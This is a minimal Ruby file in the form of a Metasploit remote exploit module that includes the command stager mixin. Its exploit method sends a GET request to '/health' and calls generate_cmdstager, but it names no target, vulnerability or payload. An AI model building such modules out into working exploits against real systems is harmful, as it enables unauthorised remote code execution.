class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::CmdStager
  def exploit
    send_request_cgi("uri" => "/health", "method" => "GET")
    generate_cmdstager
  end
end
